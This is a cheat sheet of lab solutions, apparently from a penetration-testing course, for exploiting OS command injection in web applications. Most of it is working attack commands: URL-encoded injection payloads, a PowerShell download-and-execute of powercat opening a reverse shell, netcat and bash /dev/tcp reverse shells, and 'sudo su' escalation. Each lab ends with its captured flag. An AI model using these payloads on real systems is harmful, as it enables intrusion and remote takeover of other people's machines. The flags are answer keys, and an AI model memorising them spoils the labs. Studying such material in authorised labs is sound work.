# OS Command Injection

Modified Web Content and new Input Textbox
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/OS-Command-Injection-23.png)

Clone command for the ExploitDB repository
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/OS-Command-Injection-24.png)

Successfully cloned the ExploitDB Repository via the Web Application
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/OS-Command-Injection-25.png)

Archive Parameter in the POST request
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/OS-Command-Injection-26.png)

Detected Command Injection for ipconfig
>``` shell
>kali@kali:~$ curl -X POST --data 'Archive=ipconfig' http://192.168.50.189:8000/archive
>
># ========== Expected Result ==========
>Command Injection detected. Aborting...%!(EXTRA string=ipconfig)
># =====================================
>```

Entering git as command
>``` shell
>kali@kali:~$ curl -X POST --data 'Archive=git' http://192.168.50.189:8000/archive
>
># ========== Expected Result ==========
>An error occured with execution: exit status 1 and usage: git [--version] [--help] [-C <path>] [-c <name>=<value>]
>           [--exec-path[=<path>]] [--html-path] [--man-path] [--info-path]
>           [-p | --paginate | -P | --no-pager] [--no-replace-objects] [--bare]
>...
>   push      Update remote refs along with associated objects
>
>'git help -a' and 'git help -g' list available subcommands and some
>concept guides. See 'git help <command>' or 'git help <concept>'
>to read about a specific subcommand or concept.
>See 'git help git' for an overview of the system.
># =====================================
>```

Using git version to detect the operating system
>``` shell
>kali@kali:~$ curl -X POST --data 'Archive=git version' http://192.168.50.189:8000/archive
>
># ========== Expected Result ==========
>Repository successfully cloned with command: git version and output: git version 2.35.1.windows.2
># =====================================
>```

Entering git and ipconfig with encoded semicolon
>``` shell
>kali@kali:~$ curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
>
># ========== Expected Result ==========
>...
>'git help -a' and 'git help -g' list available subcommands and some
>concept guides. See 'git help <command>' or 'git help <concept>'
>to read about a specific subcommand or concept.
>See 'git help git' for an overview of the system.
>
>Windows IP Configuration
>
>
>Ethernet adapter Ethernet0 2:
>
>   Connection-specific DNS Suffix  . : 
>   IPv4 Address. . . . . . . . . . . : 192.168.50.189
>   Subnet Mask . . . . . . . . . . . : 255.255.255.0
>   Default Gateway . . . . . . . . . : 192.168.50.254
># =====================================
>```

Code Snippet to check where our code is executed
>``` shell
>(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
>```

Determining where the injected commands are executed
>``` shell
>kali@kali:~$ curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive
>
># ========== Expected Result ==========
>...
>See 'git help git' for an overview of the system.
>PowerShell
># =====================================
>```

Serve Powercat via Python3 web server
>``` shell
>kali@kali:~$ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
>
>kali@kali:~$ python3 -m http.server 80
>
># ========== Expected Result ==========
>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
># =====================================
>```

Starting Netcat listener on port 4444
>``` shell
>kali@kali:~$ nc -nvlp 4444
>
># ========== Expected Result ==========
>listening on [any] 4444 ...
># =====================================
>```

Command to download PowerCat and execute a reverse shell
>``` shell
>IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell
>```

Downloading Powercat and creating a reverse shell via Command Injection
>``` shell
>kali@kali:~$ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
>```

Python3 web server shows GET request for powercat.ps1
>``` shell
>kali@kali:~$ python3 -m http.server 80
>
># ========== Expected Result ==========
>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
>192.168.50.189 - - [05/Apr/2022 09:05:48] "GET /powercat.ps1 HTTP/1.1" 200 -
># =====================================
>```

Successfull reverse shell connection via Command Injection
>``` shell
>kali@kali:~$ nc -nvlp 4444
>
># ========== Expected Result ==========
>listening on [any] 4444 ...
>connect to [192.168.119.3] from (UNKNOWN) [192.168.50.189] 50325
>Windows PowerShell 
>Copyright (C) Microsoft Corporation. All rights reserved.
>
>PS C:\Users\Administrator\Documents\meteor>
># =====================================
>```

Lab 1 - Follow the steps above and exploit the command injection vulnerability on VM #1 to obtain a reverse shell. Since the machine is not connected to the internet, you have to skip the step of cloning the repository from the beginning of this section. Find the flag on the Desktop for the Administrator user.
>``` shell
># Verify Command Injection Works (Target: 192.168.118.189)
>kali@kali:~$ curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.118.189:8000/archive
>
># ========== Expected Result ==========
>...
>Windows IP Configuration
>
>
>Ethernet adapter Ethernet0:
>
>   Connection-specific DNS Suffix  . : 
>   IPv4 Address. . . . . . . . . . . : 192.168.118.189
>   Subnet Mask . . . . . . . . . . . : 255.255.255.0
>   Default Gateway . . . . . . . . . : 192.168.118.254
>
># =====================================
>
># Download Powercat script
>kali@kali:~$ wget https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1
>
># ========== Expected Result ==========
>--2025-11-18 11:00:54--  https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1
>Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
>Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
>HTTP request sent, awaiting response... 200 OK
>Length: 37667 (37K) [text/plain]
>Saving to: ‘powercat.ps1.2’
>
>powercat.ps1.2         100%[============================>]  36.78K  --.-KB/s    in 0.008s  
>
>2025-11-18 11:00:54 (4.73 MB/s) - ‘powercat.ps1.2’ saved [37667/37667]
># =====================================
>
># Start a Python Web Server
>kali@kali:~$ python3 -m http.server 80
>
># ========== Expected Result ==========
>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
># =====================================
>
># Start Netcat Listener
>nc -lvnp 4444
>
># ========== Expected Result ==========
>listening on [any] 4444 ...
># =====================================
>
># Exploit the Web App With Payload (Target: 192.168.118.189, Kali IP: 192.168.45.203)
>curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.45.203%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.45.203%20-p%204444%20-e%20powershell' http://192.168.118.189:8000/archive
>
># ========== Expected Result ==========
>connect to [192.168.45.203] from (UNKNOWN) [192.168.118.189] 59393
>Windows PowerShell
>Copyright (C) Microsoft Corporation. All rights reserved.
>
>Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
>
>
>PS C:\Users\Administrator\Documents\meteor>
># =====================================
>
># Find the flag on the Desktop for the Administrator user.
>PS C:\Users\Administrator\Documents\meteor> cd C:\Users\Administrator\Desktop
>
>PS C:\Users\Administrator\Desktop> dir
>
># ========== Expected Result ==========
>dir
>
>
>    Directory: C:\Users\Administrator\Desktop
>
>
>Mode                 LastWriteTime         Length Name                                                                 
>----                 -------------         ------ ----                                                                 
>-a----        11/18/2025   8:40 AM             38 secrets.txt
># =====================================
>
># View secrets.txt
>PS C:\Users\Administrator\Desktop> type secrets.txt
>
># ========== Expected Result ==========
>type secrets.txt
>OS{ceb86d2cd9259de098bd192693fe0e16}
># =====================================
>```
>OS{ceb86d2cd9259de098bd192693fe0e16}

Lab 2 - For this exercise the Mountain Vaults application runs on Linux (VM #2). Exploit the command injection vulnerability like we did in this section, but this time use Linux specific commands to obtain a reverse shell. As soon as you have a reverse shell use the sudo su command to gain elevated privileges. Once you gain elevated privileges, find the flag located in the /opt/config.txt file.
>``` shell
># Start a Netcat listener on port 4444 to catch the reverse shell connection
>kali@kali:~$ nc -lvnp 4444
>
># ========== Expected Result ==========
>listening on [any] 4444 ...
># =====================================
>
># Scan all TCP ports on the target to identify which ports are open (Target: 192.168.110.16)
>kali@kali:~$ nmap -p- 192.168.110.16
>
># ========== Expected Result ==========
>Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-19 07:13 CST
>Nmap scan report for 192.168.110.16
>Host is up (0.038s latency).
>Not shown: 65533 closed tcp ports (reset)
>PORT   STATE SERVICE
>22/tcp open  ssh
>80/tcp open  http
>
>Nmap done: 1 IP address (1 host up) scanned in 13.76 seconds
># =====================================
>
># Verify command injection by appending ';whoami' to the Archive parameter (URL encoded) (Target: 192.168.110.16)
>kali@kali:~$ curl -X POST --data 'Archive=git%3Bwhoami' http://192.168.110.16:80/archive
>
># ========== Expected Result ==========
>...
>'git help -a' and 'git help -g' list available subcommands and some
>concept guides. See 'git help <command>' or 'git help <concept>'
>to read about a specific subcommand or concept.
>stanley
># =====================================
>
># Check if 'nc' (netcat) is installed on the target system, which is required for reverse shell (Target: 192.168.110.16)
>kali@kali:~$ curl -X POST --data 'Archive=git%3Bwhich%20nc' http://192.168.110.16:80/archive
>
># ========== Expected Result ==========
>...
>'git help -a' and 'git help -g' list available subcommands and some
>concept guides. See 'git help <command>' or 'git help <concept>'
>to read about a specific subcommand or concept.
>/bin/nc
># =====================================
>
># Execute a reverse shell payload:
># - Remove any existing named pipe (/tmp/f)
># - Create a named pipe at /tmp/f
># - Use the pipe to send a shell to the attacker using Netcat
># - Connects back to the attacker's machine on port 4444 (Target: 192.168.110.16, Kali IP: 192.168.45.203)
>kali@kali:~$ curl -X POST --data 'Archive=git%3Brm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.45.203%204444%20%3E%2Ftmp%2Ff' http://192.168.110.16:80/archive
>
># ========== Expected Result ==========
>connect to [192.168.45.203] from (UNKNOWN) [192.168.110.16] 54158
>/bin/sh: 0: can't access tty; job control turned off
>$
># =====================================
>
># Elevate privileges to root if the user has sudo access without a password
>$ sudo su
>
># Confirm current user identity (should return 'root' after successful privilege escalation)
>whoami
>
># ========== Expected Result ==========
>root
># =====================================
>
># Read and display the flag located in /opt/config.txt
>cat /opt/config.txt
>
># ========== Expected Result ==========
>OS{9396614b03580818904838e5f08c3137}
># =====================================
>```
>OS{9396614b03580818904838e5f08c3137}

Lab 3 - Capstone Lab: Start the Future Factor Authentication application on VM #3. Identify the vulnerability, exploit it and obtain a reverse shell. Use sudo su in the reverse shell to obtain elevated privileges and find the flag located in the /root/ directory.
>``` shell
># Test if the target machine is reachable (Target: 192.168.110.16)
>kali@kali:~$ ping -c 3 192.168.110.16
>
># ========== Expected Result ==========
>PING 192.168.110.16 (192.168.110.16) 56(84) bytes of data.
>64 bytes from 192.168.110.16: icmp_seq=1 ttl=61 time=37.6 ms
>64 bytes from 192.168.110.16: icmp_seq=2 ttl=61 time=36.6 ms
>...
># =====================================
>
># Scan all TCP ports on the target to identify which ports are open (Target: 192.168.110.16)
>kali@kali:~$ nmap -p- 192.168.110.16
>
># ========== Expected Result ==========
>Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-19 07:37 CST
>Nmap scan report for 192.168.110.16
>Host is up (0.038s latency).
>Not shown: 65533 closed tcp ports (reset)
>PORT   STATE SERVICE
>22/tcp open  ssh
>80/tcp open  http
>
>Nmap done: 1 IP address (1 host up) scanned in 13.45 seconds
># =====================================
>
># Visit the login page in a browser to manually inspect input fields (Target: 192.168.110.16)
># - The page has three fields: username, password, and ffa (the vulnerable one)
>visit in browser: http://192.168.110.16/login
>
># Start a Netcat listener on port 4444 to catch the reverse shell connection
>kali@kali:~$ nc -lvnp 4444
>
># ========== Expected Result ==========
>listening on [any] 4444 ...
># =====================================
>
># Exploit the command injection vulnerability in the 'ffa' field using a reverse shell payload (Target: 192.168.110.16, Kali IP: 192.168.45.203)
># - Breaks out of double quotes
># - Executes a reverse shell using bash to connect back to Kali
># - Comments out the rest of the original command to avoid syntax errors
>kali@kali:~$ curl -X POST http://192.168.110.16/login \
>  -d 'username=test' \
>  -d 'password=test' \
>  -d 'ffa=%22%20%26%26%20bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.203%2F4444%200%3E%261%27%20%23'
>
># ========== Expected Result ==========
>connect to [192.168.45.203] from (UNKNOWN) [192.168.110.16] 37460
>bash: cannot set terminal process group (1): Inappropriate ioctl for device
>bash: no job control in this shell
>To run a command as administrator (user "root"), use "sudo <command>".
>See "man sudo_root" for details.
>
>yelnats@b94a0c891dc9:/app$
># =====================================
>
># In the reverse shell: escalate privileges to root using sudo (if allowed without password)
>yelnats@b94a0c891dc9:/app$ sudo su
>
># Confirm the current user after privilege escalation
>whoami
>
># ========== Expected Result ==========
>root
># =====================================
>
># Read and display the flag located in the root user's home directory
>cat /root/flag.txt
>
># ========== Expected Result ==========
>OS{db9c4725c424008bfd56ca3bfff0fb49}
># =====================================
>```
>OS{db9c4725c424008bfd56ca3bfff0fb49}

Lab 4 - Capstone Lab: Enumerate the machine VM #4. Find the web application and get access to the system. The flag can be found in C:\inetpub\.
>``` shell
>
>```
>
